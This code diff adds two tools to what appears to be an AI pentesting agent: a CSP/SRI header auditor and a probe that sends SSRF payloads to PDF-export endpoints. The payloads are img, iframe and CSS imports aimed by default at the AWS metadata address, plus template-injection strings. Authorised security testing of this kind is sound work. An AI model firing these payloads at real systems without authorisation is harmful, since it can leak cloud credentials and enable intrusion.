@@ -1842,3 +1842,217 @@ register(
     ),
     _deserialization_check,
 )
+
+
+# ---------------------------------------------------------------------------
+# csp_audit — CSP header nonce reuse, SRI, and misconfiguration analysis
+# ---------------------------------------------------------------------------
+
+async def _csp_audit(args: dict) -> str:
+    target = (args.get("target") or "").strip()
+    if not target:
+        return "Error: target is required."
+    project_id = args.get("project_id")
+    timeout_s = int(args.get("timeout", 30))
+
+    cmd = [
+        "curl", "-sL", "-m", str(timeout_s),
+        "-D", "-",
+        "--user-agent", "Mozilla/5.0 (X11; Linux x86_64) pentesting-agent/1.0",
+        target,
+    ]
+    stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s + 5)
+    if rc == -1:
+        return stderr
+
+    lines = stdout.splitlines()
+    header_section = []
+    body_lines = []
+    in_body = False
+    for line in lines:
+        if line.strip() == "" and not in_body and header_section:
+            in_body = True
+            continue
+        if in_body:
+            body_lines.append(line)
+        else:
+            header_section.append(line)
+
+    headers: dict = {}
+    for h in header_section:
+        if ":" in h:
+            k, _, v = h.partition(":")
+            headers[k.strip().lower()] = v.strip()
+
+    findings: list[str] = []
+    raw_csp = headers.get("content-security-policy", "")
+
+    if not raw_csp:
+        findings.append("MISSING: Content-Security-Policy header not present — A05 (security misconfiguration)")
+    else:
+        findings.append(f"CSP: {raw_csp[:500]}")
+        findings.append("")
+
+        # Parse directives
+        directives: dict = {}
+        for part in raw_csp.split(";"):
+            part = part.strip()
+            if not part:
+                continue
+            tokens = part.split()
+            directives[tokens[0].lower()] = tokens[1:] if len(tokens) > 1 else []
+
+        # Check for unsafe-inline / unsafe-eval
+        script_src = directives.get("script-src", directives.get("default-src", []))
+        if "'unsafe-inline'" in script_src:
+            findings.append("ISSUE: 'unsafe-inline' in script-src — negates nonce/hash-based XSS protection")
+        if "'unsafe-eval'" in script_src:
+            findings.append("ISSUE: 'unsafe-eval' in script-src — enables eval() exploitation")
+
+        # Check nonce presence
+        nonces = [t for t in script_src if t.startswith("'nonce-")]
+        if nonces:
+            findings.append(f"NONCE DETECTED: {nonces}")
+            # Check for nonce reuse across multiple requests
+            findings.append("ACTION REQUIRED: Send 3+ requests and compare nonce values — reused nonces defeat CSP.")
+        else:
+            findings.append("INFO: No nonce in script-src — check for hash-based policy or unsafe-inline")
+
+        # Check wildcard sources
+        wildcards = [t for t in script_src if "*" in t and t != "'nonce-*'"]
+        if wildcards:
+            findings.append(f"ISSUE: Wildcard script sources detected: {wildcards} — allows loading scripts from any subdomain")
+
+        # Check missing directives
+        for missing_dir in ["default-src", "frame-ancestors", "base-uri", "form-action"]:
+            if missing_dir not in directives:
+                findings.append(f"MISSING directive: {missing_dir}")
+
+        # Check report-uri / report-to
+        if "report-uri" not in directives and "report-to" not in directives:
+            findings.append("INFO: No report-uri/report-to — CSP violations are silent")
+
+    # SRI check — look for <script> tags without integrity attributes in body
+    body = "\n".join(body_lines)
+    import re as _re
+    script_tags = _re.findall(r"<script[^>]*src=['\"][^'\"]+['\"][^>]*>", body, _re.IGNORECASE)
+    no_sri = [t for t in script_tags if "integrity=" not in t.lower()]
+    if no_sri:
+        findings.append(f"\nSRI MISSING on {len(no_sri)} external script tag(s):")
+        for tag in no_sri[:10]:
+            findings.append(f"  {tag[:120]}")
+        findings.append("RISK: Without SRI, a compromised CDN can inject arbitrary JavaScript.")
+
+    # X-Frame-Options
+    xfo = headers.get("x-frame-options", "")
+    if not xfo:
+        findings.append("\nMISSING: X-Frame-Options — clickjacking risk (use frame-ancestors in CSP instead)")
+    else:
+        findings.append(f"\nX-Frame-Options: {xfo}")
+
+    result = f"CSP Audit: {target}\n\n" + "\n".join(findings)
+    await _persist(project_id, "csp_audit", args, result, "", 0)
+    return result
+
+
+register(
+    Tool(
+        name="csp_audit",
+        description=(
+            "Audit Content Security Policy headers for nonce reuse, unsafe-inline/eval, "
+            "wildcard sources, missing directives, and SRI gaps on external scripts. "
+            "Use after initial http_probe on every web target."
+        ),
+        inputSchema={
+            "type": "object",
+            "required": ["target"],
+            "properties": {
+                "target": {"type": "string", "description": "Target URL"},
+                "project_id": {"type": "integer"},
+                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
+            },
+        },
+    ),
+    _csp_audit,
+)
+
+
+# ---------------------------------------------------------------------------
+# pdf_generator_ssrf — probe PDF export endpoints for SSRF via crafted HTML
+# ---------------------------------------------------------------------------
+
+async def _pdf_generator_ssrf(args: dict) -> str:
+    target = (args.get("target") or "").strip()
+    ssrf_callback = (args.get("ssrf_callback") or "http://169.254.169.254/latest/meta-data/").strip()
+    field = (args.get("field") or "body").strip()
+    project_id = args.get("project_id")
+    timeout_s = int(args.get("timeout", 30))
+
+    if not target:
+        return "Error: target is required."
+
+    # Payloads for PDF generator SSRF / template injection
+    payloads = [
+        # SSRF via img src
+        f'<img src="{ssrf_callback}">',
+        # SSRF via iframe
+        f'<iframe src="{ssrf_callback}"></iframe>',
+        # SSRF via CSS @import
+        f'<style>@import url("{ssrf_callback}");</style>',
+        # Template injection (Twig/Jinja2)
+        "{{7*7}}",
+        "${7*7}",
+        "<%= 7*7 %>",
+    ]
+
+    results: list[str] = [f"PDF generator SSRF/injection probe: {target}", ""]
+
+    for payload in payloads:
+        data = json.dumps({field: payload})
+        cmd = [
+            "curl", "-sL", "-m", str(timeout_s), "-X", "POST",
+            "-H", "Content-Type: application/json",
+            "-d", data,
+            "-w", "\n--- HTTP %{http_code} size=%{size_download} time=%{time_total}s ---",
+            target,
+        ]
+        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s + 5)
+        resp_snippet = (stdout or stderr)[:300].replace("\n", " ")
+        results.append(f"Payload: {payload[:80]!r}")
+        results.append(f"  Response: {resp_snippet}")
+
+        # Detect template injection in response
+        if "49" in stdout:
+            results.append("  [POSSIBLE SSTI] 7*7=49 reflected — template injection signal")
+        results.append("")
+
+    results.append("NOTE: Check your out-of-band callback server for incoming HTTP/DNS requests.")
+    results.append("If callback fires, SSRF is confirmed. Record as ttp_category='ssrf', severity='high'.")
+
+    result = "\n".join(results)
+    await _persist(project_id, "pdf_generator_ssrf", args, result, "", 0)
+    return result
+
+
+register(
+    Tool(
+        name="pdf_generator_ssrf",
+        description=(
+            "Probe PDF export / document generation endpoints for SSRF via crafted rich-text HTML "
+            "and server-side template injection. Sends img/iframe/CSS payloads and template syntax "
+            "to a POST endpoint. Monitor your out-of-band callback server for DNS/HTTP hits."
+        ),
+        inputSchema={
+            "type": "object",
+            "required": ["target"],
+            "properties": {
+                "target": {"type": "string", "description": "PDF generation endpoint URL"},
+                "ssrf_callback": {"type": "string", "description": "SSRF callback URL to inject (default: AWS metadata)"},
+                "field": {"type": "string", "description": "JSON field name to inject into (default: body)"},
+                "project_id": {"type": "integer"},
+                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
+            },
+        },
+    ),
+    _pdf_generator_ssrf,
+)
